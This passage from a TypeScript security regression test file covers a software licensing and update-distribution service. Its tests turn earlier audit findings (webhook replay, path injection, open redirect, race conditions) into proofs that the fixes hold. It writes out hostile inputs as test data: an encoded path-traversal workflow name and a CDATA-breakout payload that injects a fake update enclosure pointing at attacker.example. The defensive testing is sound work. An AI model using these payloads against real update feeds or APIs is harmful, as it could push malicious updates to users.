      req("https://key.plrs.im/djdl/beta/appcast.xml"),
      envFor(),
      db,
      makeProduct(),
      "channelAppcast",
      { channel: "beta" },
      fetchImpl,
    );
    expect(res.status).toBe(404);

    // No request ever normalised onto the injected endpoint — every GitHub call stayed
    // inside the configured repo.
    for (const call of calls) {
      const { pathname } = new URL(call.url);
      expect(pathname).not.toBe("/orgs/attacker-org/repos");
      expect(pathname.split("/")).not.toContain("orgs");
    }
    // …the workflow name stayed a single, encoded path segment.
    const runs = calls.find((c) => c.url.includes("/actions/workflows/"));
    expect(runs).toBeDefined();
    expect(new URL(runs!.url).pathname).toBe(
      "/repos/acme/djdl/actions/workflows/..%2F..%2F..%2F..%2F..%2Forgs%2Fattacker-org%2Frepos%23/runs",
    );
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-06 — arch aliases from the router reach ARCH_TOKENS[undefined]
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-06 aarch64 / amd64 route aliases raise an unhandled TypeError", () => {
  const cases: Array<["cli" | "dmg", Arch]> = [
    ["dmg", "aarch64" as Arch],
    ["dmg", "amd64" as Arch],
    ["cli", "aarch64" as Arch],
    ["cli", "amd64" as Arch],
  ];
  // FIXED (R6-08): `normalizeArch` canonicalises the aliases before they reach ARCH_TOKENS,
  // so the aliases resolve to the real arm64/x86_64 asset instead of throwing a 500.
  for (const [kind, arch] of cases) {
    it(`${kind} + ${arch} throws instead of 404`, async () => {
      const db = makeTestDb();
      await seedReleaseConfig(db);
      const rel = release({
        tag_name: "v1.2.3",
        assets: [asset("djdl-arm64.dmg", 100), asset("djdl-arm64", 101)],
      });
      const { fetchImpl } = stubFetch([
        [
          "/releases/tags/",
          () => new Response(JSON.stringify(rel), { status: 200 }),
        ],
        ["/releases/assets/", () => new Response("BINARY", { status: 200 })],
      ]);
      const res = await handleRelease(
        req(`https://key.plrs.im/djdl/${kind}/1.2.3/djdl-${arch}`),
        envFor(),
        db,
        makeProduct(),
        kind,
        { version: "1.2.3", arch },
        fetchImpl,
      );
      // `aarch64` resolves to the arm64 asset; `amd64` has no x86_64 asset here, so 404 —
      // never an unhandled TypeError.
      expect([200, 404]).toContain(res.status);
    });
  }
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-07 — webhook: attacker-chosen ref + no replay protection
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-07 webhook resync trusts payload-supplied ref and has no replay protection", () => {
  // FIXED (R6-05): `resyncRepo` takes no ref at all — GitHub resolves the DB-configured repo's
  // own default-branch head (`commits/HEAD`), and every document is read at THAT sha (ST-01a), so
  // nothing in the payload steers which commit's `.pkey/` is applied.
  it("payload.after is passed straight through to ?ref= (any branch / PR head / old sha)", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (
        await linkRepo(
          env,
          db,
          "acme-org/acme-app",
          NOW,
          stub.fetchImpl,
          ingestFor(SERVICES),
        )
      ).ok,
    ).toBe(true);
    stub.calls.length = 0;

    // A ref that was NEVER reviewed on the default branch.
    const res = await handleGithubWebhook(
      deliveryRequest(
        await signedPush(
          pushPayload({ after: "refs/pull/9/head" }),
          "webhook-secret",
        ),
      ),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(res.status).toBe(200);
    const contents = stub.calls.filter((c) => c.url.includes("/contents/"));
    expect(contents.length).toBeGreaterThan(0);
    expect(contents.every((c) => c.url.endsWith(`?ref=${HEAD_SHA}`))).toBe(
      true,
    );
    expect(contents.every((c) => !c.url.includes("pull"))).toBe(true);
  });

  // FIXED (R6-05): a delivery whose `installation.id` does not match the product's stored
  // `gh_installation_id` is refused, so one leaked webhook secret is no longer a
  // cross-tenant forgery capability.
  it("a delivery for the wrong installation id is refused", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (
        await linkRepo(
          env,
          db,
          "acme-org/acme-app",
          NOW,
          stub.fetchImpl,
          ingestFor(SERVICES),
        )
      ).ok,
    ).toBe(true);
    await db.run(
      "UPDATE release_config SET binary_name = ? WHERE product = ?",
      "acme-quarantined",
      "acme",
    );
    stub.calls.length = 0;

    const res = await handleGithubWebhook(
      deliveryRequest(
        await signedPush(
          pushPayload({ installation: { id: 999999 } }),
          "webhook-secret",
        ),
      ),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    const body = (await res.json()) as {
      ok: boolean;
      products: Array<{ error?: string }>;
    };
    expect(body.ok).toBe(false);
    expect(body.products[0]?.error).toContain("installation id");
    // No manifest was fetched and the operator's quarantine survived.
    expect(stub.calls.filter((c) => c.url.includes("/contents/"))).toEqual([]);
    expect((await getReleaseConfig(db, "acme"))?.binary_name).toBe(
      "acme-quarantined",
    );
  });

  it("REPLAY: re-posting one captured delivery re-runs the full destructive resync and reverts operator edits", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (
        await linkRepo(
          env,
          db,
          "acme-org/acme-app",
          NOW,
          stub.fetchImpl,
          ingestFor(SERVICES),
        )
      ).ok,
    ).toBe(true);

    // Capture ONE valid delivery (body + signature).
    const delivery = await signedPush(pushPayload(), "webhook-secret");
    const first = await handleGithubWebhook(
      deliveryRequest(delivery),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(first.status).toBe(200);

    // An operator responds to an incident: adds a tier and pins the OIDC issuer by hand.
    await db.run(
      `INSERT INTO tiers (product, id, label, profile_id, policy_expiry_days,
         policy_device_limit, channels_json, min_version, max_version,
         policy_fingerprint, modified_by, modified_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?)`,
      "acme",
      "incident-lockdown",
      "Locked",
      null,
      null,
      // Was 0. R11-02: licenseCore gates the seat check on `limit > 0`, so a 0 here meant
      // UNLIMITED devices — the exact opposite of "incident lockdown" — and 0015 now rejects
      // it at the database. 1 is the tightest limit that actually means what this test says.
      1,
      null,
      null,
      null,
      null,
      "operator",
      NOW + 20,
    );
    await db.run(
      "UPDATE release_config SET binary_name = ? WHERE product = ?",
      "acme-quarantined",
      "acme",
    );

    // FIXED (R6-06): the delivery GUID is remembered in KV, so replaying the EXACT same
    // bytes + signature is ignored instead of re-running the destructive resync.
    const replay = await handleGithubWebhook(
      deliveryRequest(delivery),
      env,
      db,
      NOW + 30,
      stub.fetchImpl,
    );
    expect(replay.status).toBe(200);
    expect(await replay.json()).toMatchObject({
      ok: true,
      ignored: "duplicate-delivery",
    });

    // …and the operator's incident response survived.
    const tier = await db.first<{ id: string }>(
      "SELECT id FROM tiers WHERE product = ? AND id = ?",
      "acme",
      "incident-lockdown",
    );
    expect(tier?.id).toBe("incident-lockdown");
    expect((await getReleaseConfig(db, "acme"))?.binary_name).toBe(
      "acme-quarantined",
    );
  });

  // PARTLY FIXED — splitting `.pkey/` into "repo may own" vs "admin only" (access gating,
  // admin_group, tiers) is fix direction #4 of R6-05 and is still open. The one piece that did
  // land is the OIDC issuer: R9-01 gates a *new or changed* `oidc_config.issuer` on the
  // operator's `OIDC_ISSUER_ALLOWLIST` at both ingest paths, and the gate runs before the
  // first write, so a push that tries to introduce an unlisted IdP applies nothing at all.
  it("a webhook push that repoints the IdP at an unlisted host is refused outright", async () => {
    const db = makeTestDb();
    const env = envFor(); // no OIDC_ISSUER_ALLOWLIST — the fail-closed default
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (
        await linkRepo(
          env,
          db,
          "acme-org/acme-app",
          NOW,
          stub.fetchImpl,
          ingestFor(SERVICES),
        )
      ).ok,
    ).toBe(true);

    stub.files[".pkey/product.json"] = ATTACKER_PRODUCT_JSON;

    const res = await handleGithubWebhook(
      deliveryRequest(
        await signedPush(
          pushPayload({ head_commit: { modified: [".pkey/product.json"] } }),
          "webhook-secret",
        ),
      ),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(res.status).toBe(200); // the webhook still ACKs; the resync inside it failed
    const oidc = await db.first<{ issuer: string; client_id: string }>(
      "SELECT * FROM oidc_config WHERE product = ?",
      "acme",
    );
    expect(oidc).toBeNull(); // no IdP introduced
    // ...and because the gate precedes every write, the rest of the hostile manifest never
    // landed either.
    const tier = await db.first<{ policy_device_limit: number | null }>(
      "SELECT policy_device_limit FROM tiers WHERE product = ? AND id = ?",
      "acme",
      "pro",
    );
    expect(tier?.policy_device_limit).not.toBe(999);
  });

  // STILL NOT FIXED (R6-05 proper): once the issuer host IS operator-blessed, everything else
  // in `.pkey/product` is still repo-owned with no admin-ownership flag — clientId and tiers are
  // both rewritten by a push.
  it("a webhook push still rewrites clientId and tiers once the host is allowlisted", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    env.OIDC_ISSUER_ALLOWLIST = "idp.attacker.example";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (
        await linkRepo(
          env,
          db,
          "acme-org/acme-app",
          NOW,
          stub.fetchImpl,
          ingestFor(SERVICES),
        )
      ).ok,
    ).toBe(true);

    stub.files[".pkey/product.json"] = ATTACKER_PRODUCT_JSON;

    const res = await handleGithubWebhook(
      deliveryRequest(
        await signedPush(
          pushPayload({ head_commit: { modified: [".pkey/product.json"] } }),
          "webhook-secret",
        ),
      ),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(res.status).toBe(200);
    const oidc = await db.first<{ issuer: string; client_id: string }>(
      "SELECT * FROM oidc_config WHERE product = ?",
      "acme",
    );
    expect(oidc?.issuer).toBe("https://idp.attacker.example");
    expect(oidc?.client_id).toBe("attacker-client");
    const tier = await db.first<{ policy_device_limit: number | null }>(
      "SELECT policy_device_limit FROM tiers WHERE product = ? AND id = ?",
      "acme",
      "pro",
    );
    expect(tier?.policy_device_limit).toBe(999);
  });

  // The same push is also the delivery vehicle for an unbounded seat cap: a tier's
  // `policyDeviceLimit` feeds `claimDeviceSeat`'s recursive CTE, which is O(limit) inside a
  // SINGLE statement, so a six-figure limit is not a big number, it is a statement that never
  // returns, on every subsequent activation for that product.
  it("a repo push cannot raise a tier's seat cap past the ceiling", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (
        await linkRepo(
          env,
          db,
          "acme-org/acme-app",
          NOW,
          stub.fetchImpl,
          ingestFor(SERVICES),
        )
      ).ok,
    ).toBe(true);

    stub.files[".pkey/product.json"] = OVERSIZED_LIMIT_PRODUCT_JSON;
    const res = await handleGithubWebhook(
      deliveryRequest(
        await signedPush(
          pushPayload({ head_commit: { modified: [".pkey/product.json"] } }),
          "webhook-secret",
        ),
      ),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    // The webhook still ACKs (it always does); the resync inside it reports the refusal.
    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      products: Array<{ ok: boolean; errors?: string[] }>;
    };
    expect(body.products[0]?.ok).toBe(false);
    // The operator has to be able to see WHY their push did not apply, so the refusal names
    // the offending path and the ceiling, not just "invalid".
    const errors = JSON.stringify(body.products[0]?.errors ?? []);
    expect(errors).toContain("policyDeviceLimit");
    expect(errors).toContain("1000");

    // Refuse, never coerce: nothing from the document landed, so there is no clamped-but-applied
    // row to reason about later.
    const tier = await db.first<{ policy_device_limit: number | null }>(
      "SELECT policy_device_limit FROM tiers WHERE product = ? AND id = ?",
      "acme",
      "pro",
    );
    expect(tier?.policy_device_limit ?? 0).toBeLessThan(100_000);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-08 — streamAsset redirect handling
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-08 streamAsset redirect handling", () => {
  it("a relative Location raises an unhandled TypeError instead of a 404", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(rel), { status: 200 }),
      ],
      [
        "/releases/assets/777",
        () =>
          new Response(null, {
            status: 302,
            headers: { Location: "/relative/redirect" },
          }),
      ],
    ]);
    await expect(
      handleRelease(
        req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64"),
        envFor(),
        db,
        makeProduct(),
        "cli",
        { version: "1.2.3", arch: "arm64" },
        fetchImpl,
      ),
    ).rejects.toThrow(TypeError);
  });

  it("the storage re-fetch is issued WITHOUT redirect:'manual', so further hops are unguarded", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    const { fetchImpl, calls } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(rel), { status: 200 }),
      ],
      [
        "/releases/assets/777",
        () =>
          new Response(null, {
            status: 302,
            headers: { Location: "https://objects.githubusercontent.com/hop1" },
          }),
      ],
      [
        "objects.githubusercontent.com",
        () => new Response("BINARY", { status: 200 }),
      ],
    ]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64"),
      envFor(),
      db,
      makeProduct(),
      "cli",
      { version: "1.2.3", arch: "arm64" },
      fetchImpl,
    );
    expect(res.status).toBe(200);
    const first = calls.find((c) => c.url.includes("/releases/assets/777"));
    const second = calls.find((c) =>
      c.url.includes("objects.githubusercontent.com"),
    );
    expect(first?.init?.redirect).toBe("manual");
    // The second hop uses the default "follow": any onward 302 is taken with no host check.
    expect(second?.init?.redirect).toBeUndefined();
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-09 — latent CDATA breakout in the appcast renderer
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-09 appcast <description> CDATA breakout (latent)", () => {
  it("descriptionHtml is neither escaped nor ]]>-neutralised", () => {
    const xml = renderAppcast({
      channelTitle: "djdl",
      link: "https://key.plrs.im",
      items: [
        {
          title: "djdl 1.2.3",
          shortVersion: "1.2.3",
          build: "1.2.3",
          url: "https://key.plrs.im/djdl/release/dl/1.2.3/djdl-arm64.dmg",
          length: 1,
          pubDate: "Thu, 02 Jan 2026 03:04:05 GMT",
          descriptionHtml:
            ']]></description><enclosure url="https://attacker.example/evil.dmg" /><description><![CDATA[',
        },
      ],
    });
    // The CDATA section is terminated early and a second <enclosure> is injected.
    expect(xml).toContain(
      '<enclosure url="https://attacker.example/evil.dmg" />',
    );
    expect(xml).toContain("]]></description>");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-10 — no downgrade / rollback protection
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-10 downgrade: deleting the newest release silently makes an older one latest", () => {
  // FIXED (P0-02). A truth-store sync now records the highest version each moving channel has
  // resolved to (`release_channel_floors`). Live resolution that lands below the floor looks the
  // floor's release up by tag: still there ⇒ served; gone ⇒ 404, and `checkReleaseHealth`
  // reports `channel-regressed`. Only an operator lowering the floor (audited) lets the older
  // release through. The PoC gains the sync step it never had — without one there is no floor.
  it("FIXED: once a sync has seen v2.0.0, deleting it 404s latest until an operator lowers the floor", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const env = envFor();
    env.ADMIN_SESSION_SECRET = "test-admin-session-secret";
    env.PLATFORM_ADMIN_GROUP = "platform-admins";

    let releases = [
      release({ tag_name: "v2.0.0" }),
      release({ tag_name: "v1.0.0" }),
    ];
    const fetchImpl: FetchImpl = async (input) => {
      const url = String(input);
      if (url.includes("/access_tokens"))
        return new Response(JSON.stringify({ token: "t" }), { status: 200 });
      if (url.includes("/releases?per_page"))
        return new Response(JSON.stringify(releases), { status: 200 });
      // `tags/<tag>` for the floor lookup: only what is still published.
      const tag = url.match(/\/releases\/tags\/([^/?]+)$/)?.[1];
      const hit = releases.find((r) => r.tag_name === tag);
      if (hit) return new Response(JSON.stringify(hit), { status: 200 });
      return new Response("nf", { status: 404 });
    };
    const latest = () =>
      handleRelease(
        req(),
        env,
        db,
        makeProduct(),
        "version",
        { version: "latest" },
        fetchImpl,
      );

    const before = await latest();
    expect(((await before.json()) as { version: string }).version).toBe(
      "2.0.0",
    );
    // The truth-store sync (push, webhook or manual resync) sees v2.0.0 and floors stable.
    await syncReleaseStore(env, db, SLUG, NOW, fetchImpl);

    // The repo owner (or anyone who can delete a release) removes v2.0.0.
    releases = [release({ tag_name: "v1.0.0" })];

    const after = await latest();
    // No silent downgrade: the channel refuses rather than promoting v1.0.0 to latest…
    expect(after.status).toBe(404);
    expect(after.headers.get("cache-control") ?? "").not.toContain("public");
    // …and health says why, naming the floor and what the list now offers.
    const health = await checkReleaseHealth(env, db, SLUG, NOW, fetchImpl);
    const regressed = health.checks.find((c) => c.id === "channel-regressed");
    expect(regressed?.status).toBe("error");
    expect(regressed?.message).toContain("2.0.0");
    expect(regressed?.message).toContain("v1.0.0");

    // A deliberate withdrawal: an operator lowers the floor, and only then does v1.0.0 serve.
    const { token, session } = await consoleTestSession(
      env,
      db,
      {
        sub: "u1",
        name: "Ada",
        email: "ada@x.io",
        groups: ["platform-admins"],
      },
      NOW,
    );
    const path = `/api/products/${SLUG}/release/channels/stable/floor`;
    const lowered = await handleAdmin(
      new Request(`https://key.plrs.im/manage${path}`, {
        method: "POST",
        headers: {
          cookie: `${ADMIN_COOKIE}=${token}`,
          [CSRF_HEADER]: session.csrf,
          "content-type": "application/json",
        },
        body: JSON.stringify({ version: "1.0.0" }),
      }) as unknown as Request,
      env,
      db,
      path,
      { now: NOW },
    );
    expect(lowered.status).toBe(200);
    const served = await latest();
    expect(served.status).toBe(200);
    expect(((await served.json()) as { version: string }).version).toBe(
      "1.0.0",
    );
  });

  // P2-05. The channel policy closes the remaining downgrade paths deliberately rather than by
  // accident: a YANKED release is never offered on a moving selector (and a yanked floor does
  // not 404 the channel — the yank is the audited withdrawal), and only an explicit, audited PIN
  // can serve an older or a yanked release.
  it("FIXED (P2-05): a yank withdraws latest to the next release; only an explicit pin serves a yanked one", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const env = envFor();
    env.ADMIN_SESSION_SECRET = "test-admin-session-secret";
    env.PLATFORM_ADMIN_GROUP = "platform-admins";
    const releases = [
      release({ tag_name: "v2.0.0" }),
      release({ tag_name: "v1.0.0" }),
    ];
    const fetchImpl: FetchImpl = async (input) => {
      const url = String(input);
      if (url.includes("/access_tokens"))
        return new Response(JSON.stringify({ token: "t" }), { status: 200 });
      if (url.includes("/releases?per_page"))
        return new Response(JSON.stringify(releases), { status: 200 });
      const tag = url.match(/\/releases\/tags\/([^/?]+)$/)?.[1];
      const hit = releases.find((r) => r.tag_name === tag);
      if (hit) return new Response(JSON.stringify(hit), { status: 200 });
      return new Response("nf", { status: 404 });
    };
    const latest = async () => {
      const res = await handleRelease(
        req(),
        env,
        db,
        makeProduct(),
        "version",
        { version: "latest" },
        fetchImpl,
      );
      return res.status === 200
        ? ((await res.json()) as { version: string }).version
        : res.status;
    };
    // The sync floors stable at 2.0.0 and records both releases.
    await syncReleaseStore(env, db, SLUG, NOW, fetchImpl);
    expect(await latest()).toBe("2.0.0");

    const { token, session } = await consoleTestSession(
      env,
      db,
      {
        sub: "u1",
        name: "Ada",
        email: "ada@x.io",
        groups: ["platform-admins"],
      },
      NOW,
    );
    const adminCall = (method: string, path: string, body: unknown) =>
      handleAdmin(
        new Request(`https://key.plrs.im/manage${path}`, {
          method,
          headers: {
            cookie: `${ADMIN_COOKIE}=${token}`,
            [CSRF_HEADER]: session.csrf,
            "content-type": "application/json",
          },
          body: JSON.stringify(body),
        }) as unknown as Request,
        env,
        db,
        path,
        { now: NOW },
      );

    const yanked = await adminCall(
      "POST",
      `/api/products/${SLUG}/release/releases/v2.0.0/yank`,
      { reason: "data loss on upgrade" },
    );
    expect(yanked.status).toBe(200);
    // Withdrawn, not regressed: latest falls back to v1.0.0 instead of serving the yanked
    // release or 404ing on the floor it set.
    expect(await latest()).toBe("1.0.0");

    // Only an explicit, audited pin brings the yanked release back.
    const pinned = await adminCall(
      "PUT",
      `/api/products/${SLUG}/release/channels/stable`,
      { pointer: "v2.0.0", pinned: true },
    );
    expect(pinned.status).toBe(200);
    expect(await latest()).toBe("2.0.0");
    const actions = await db.all<{ action: string }>(
      "SELECT action FROM audit WHERE product = ? ORDER BY rowid",
      SLUG,
    );
    expect(actions.map((a) => a.action)).toEqual([
      "release.yank",
      "release.channel.update",
    ]);
  });

  // P2-05 review. A yanked floor is LOWERED to the newest unyanked release the store holds below
  // it, never removed: yanking the newest release (which is also the floor) must not leave the
  // channel open to the very downgrade R6-10 fixed.
  it("FIXED (P2-05): yanking the floor release lowers the floor; deleting the next release still 404s", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const env = envFor();
    env.ADMIN_SESSION_SECRET = "test-admin-session-secret";
    env.PLATFORM_ADMIN_GROUP = "platform-admins";
    let releases = [
      release({ tag_name: "v2.0.0", published_at: "2026-03-01T00:00:00Z" }),
      release({ tag_name: "v1.5.0", published_at: "2026-02-01T00:00:00Z" }),
      release({ tag_name: "v1.0.0", published_at: "2026-01-01T00:00:00Z" }),
    ];
    const fetchImpl: FetchImpl = async (input) => {
      const url = String(input);
      if (url.includes("/access_tokens"))
        return new Response(JSON.stringify({ token: "t" }), { status: 200 });
      if (url.includes("/releases?per_page"))
        return new Response(JSON.stringify(releases), { status: 200 });
      const tag = url.match(/\/releases\/tags\/([^/?]+)$/)?.[1];
      const hit = releases.find((r) => r.tag_name === tag);
      if (hit) return new Response(JSON.stringify(hit), { status: 200 });
      return new Response("nf", { status: 404 });
    };
    const latest = async (e: Env = env) => {
      const res = await handleRelease(
        req(),
        e,
        db,
        makeProduct(),
        "version",
        { version: "latest" },
        fetchImpl,
      );
      return res.status === 200
        ? ((await res.json()) as { version: string }).version
        : res.status;
    };
    // The sync floors stable at 2.0.0 and records all three releases.
    await syncReleaseStore(env, db, SLUG, NOW, fetchImpl);
    expect(await latest()).toBe("2.0.0");

    const { token, session } = await consoleTestSession(
      env,
      db,
      {
        sub: "u1",
        name: "Ada",
        email: "ada@x.io",
        groups: ["platform-admins"],
      },
      NOW,
    );
    const path = `/api/products/${SLUG}/release/releases/v2.0.0/yank`;
    const yanked = await handleAdmin(
      new Request(`https://key.plrs.im/manage${path}`, {
        method: "POST",
        headers: {
          cookie: `${ADMIN_COOKIE}=${token}`,
          [CSRF_HEADER]: session.csrf,
          "content-type": "application/json",
        },
        body: JSON.stringify({ reason: "data loss on upgrade" }),
      }) as unknown as Request,
      env,
      db,
      path,
      { now: NOW },
    );
    expect(yanked.status).toBe(200);
    // The yank withdraws 2.0.0 to the next release down…
    expect(await latest()).toBe("1.5.0");

    // …and 1.5.0 now holds the channel up. Someone deletes it upstream; once the cached
    // resolution has expired (a fresh KV stands in for the 90 s TTL, with no resync to bump the
    // generation), the channel refuses rather than silently serving 1.0.0.
    releases = releases.filter((r) => r.tag_name !== "v1.5.0");
    expect(await latest(envFor())).toBe(404);

    // A resync (the deletion's webhook) leaves the RECORDED floor at the yanked 2.0.0 — the sync
    // does not read yanks — and the fallback is recomputed on every resolution, so the answer
    // does not change.
    await syncReleaseStore(env, db, SLUG, NOW + 1, fetchImpl);
    expect(await latest()).toBe(404);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-11 — portal /download/<token> open redirect + single-use TOCTOU
// ═════════════════════════════════════════════════════════════════════════════

// RE-BASELINED (P2.T2). This finding — the same defect R6-12 records — was rated **dormant**
// on one ground: `release_artifacts.source_url` had no writer in `src/`, so the missing allowlist
// could not be reached. `services/release/store.ts` gives it one, so the redirect is hardened in
// the same change and the PoC below becomes its regression test.
describe("R6-11 portal download redirect host allowlist", () => {
  it("FIXED: refuses an arbitrary off-platform source_url instead of 302ing to it", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    env.PORTAL_SESSION_SECRET = "test-portal-session-secret";
    await seedProduct(db, SLUG);
    // Release + Distribution: the services that serve a download (P2b-04).
    await enableDownloads(db, SLUG);
    await seedLicenseWithKey(db, SLUG);
    const account = await getOrCreateAccountByEmail(db, "ada@example.com", NOW);
    await syncAccountLicenseLinks(db, account.id, NOW);

    await db.run(
      `INSERT INTO release_metadata
         (product, release_id, version, title, notes, commit_sha, source_url,
          metadata_access, artifacts_access, published_at, metadata_json, created_at, modified_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "1.2.3",
      "DJDL 1.2.3",
      null,
      null,
      "https://example.com/releases/1.2.3",
      "public",
      "public",
      NOW,
      null,
      NOW,
      NOW,
    );
    await db.run(
      `INSERT INTO release_artifacts
         (product, release_id, artifact_id, name, kind, platform, arch, content_type,
          size_bytes, sha256, source_url, storage_key, sparkle_signature, access,
          metadata_json, created_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "art_1",
      "djdl.dmg",
      "dmg",
      "macos",
      "arm64",
      "application/octet-stream",
      123,
      "sha",
      // The value the finding turned into an open redirect. It is now refused: only an https
      // GitHub storage host may become a `Location` (`portal/api.ts` `redirectableSourceUrl`).
      "https://attacker.example/pwned.dmg",
      null,
      null,
      "public",
      null,
      NOW,
    );

    const token = await mintDownloadToken(env, db, {
      product: SLUG,
      releaseId: "rel_1",
      artifactId: "art_1",
      scope: { portalAccountId: account.id },

      now: NOW,
    });

    const res = await handlePortalDownload(
      new Request(
        `https://key.plrs.im/download/${token}`,
      ) as unknown as Request,
      env,
      db,
      token,
      NOW + 1,
    );
    expect(res.status).toBe(404);
    expect(res.headers.get("location")).toBeNull();
  });

  // FIXED (R9-05b / R11-05): the single-use marking is a conditional UPDATE now.
  it("TOCTOU: concurrent redemptions of a single-use token — only one wins", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    env.PORTAL_SESSION_SECRET = "test-portal-session-secret";
    await seedProduct(db, SLUG);
    // Release + Distribution: the services that serve a download (P2b-04).
    await enableDownloads(db, SLUG);
    await seedLicenseWithKey(db, SLUG);
    const account = await getOrCreateAccountByEmail(db, "ada@example.com", NOW);
    await syncAccountLicenseLinks(db, account.id, NOW);
    await db.run(
      `INSERT INTO release_metadata
         (product, release_id, version, title, notes, commit_sha, source_url,
          metadata_access, artifacts_access, published_at, metadata_json, created_at, modified_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "1.2.3",
      "DJDL 1.2.3",
      null,
      null,
      null,
      "public",
      "public",
      NOW,
      null,
      NOW,
      NOW,
    );
    await db.run(
      `INSERT INTO release_artifacts
         (product, release_id, artifact_id, name, kind, platform, arch, content_type,
          size_bytes, sha256, source_url, storage_key, sparkle_signature, access,
          metadata_json, created_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "art_1",
      "djdl.dmg",
      "dmg",
      "macos",
      "arm64",
      "application/octet-stream",
      123,
      "sha",
      // An ALLOWLISTED host, so this test still exercises the single-use race rather than
      // stopping at the host check the test above covers.
      "https://objects.githubusercontent.com/djdl.dmg",
      null,
      null,
      "public",
      null,
      NOW,
    );
    // A public repository, so the allowlisted GitHub URL is servable and the race is what is tested.
    await seedRepositoryVisibility(env, db, SLUG, "public");
    const token = await mintDownloadToken(env, db, {
      product: SLUG,
      releaseId: "rel_1",
      artifactId: "art_1",
      scope: { portalAccountId: account.id },

      now: NOW,
    });
    // better-sqlite3 is synchronous, so model D1's real async round-trips: every DB call
    // yields to the event loop before running. Nothing about the handler changes.
    const asyncDb = new Proxy(db, {
      get(target, prop, receiver) {
        const value = Reflect.get(target, prop, receiver);
        if (typeof value !== "function") return value;
        return async (...args: unknown[]) => {
          await new Promise((r) => setTimeout(r, 0));
          return (value as (...a: unknown[]) => unknown).apply(target, args);
        };
      },
    }) as Db;

    const fire = (): Promise<Response> =>
      handlePortalDownload(
        new Request(
          `https://key.plrs.im/download/${token}`,
        ) as unknown as Request,
        env,
        asyncDb,
        token,
        NOW + 1,
      );
    // Both still interleave between the `used_at` read and `markPortalDownloadUsed` — the
    // database, not the ordering, is what decides which one gets the redirect.
    const [a, b] = await Promise.all([fire(), fire()]);
    expect([a.status, b.status].sort()).toEqual([302, 404]);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// Two regexes disagreed, so a manifest-legal binary name 404'd install.sh forever
// ═════════════════════════════════════════════════════════════════════════════
//
// `install.ts` bounded `binaryName` with exactly the manifest validator's class, then bounded
// the DERIVED `versionEnv` with a shell-identifier class, but the derivation lived in `source.ts`
// and satisfied neither bound. Two axes:
//   (a) a LEADING DIGIT. `7zip` is a legal binaryName; `7ZIP_VERSION` is not a legal shell
